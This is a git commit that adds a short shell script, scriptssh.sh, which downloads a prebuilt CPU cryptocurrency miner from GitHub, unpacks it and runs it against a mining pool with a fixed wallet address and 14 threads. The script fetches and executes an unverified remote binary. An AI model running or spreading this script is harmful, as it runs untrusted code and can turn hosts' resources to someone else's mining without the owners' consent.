45b58af57bfac4f79de3077a5f1d892180c0c930
dfeeney113 <96128457+dfeeney113@users.noreply.github.com>
2021-12-25 03:56:28 +0700

    Add files via upload

---
+++ scriptssh.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+ ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHffsZ47VU1cv4f1AU2rM2U61eWvh3cMQd.huwawei -p x --cpu 14
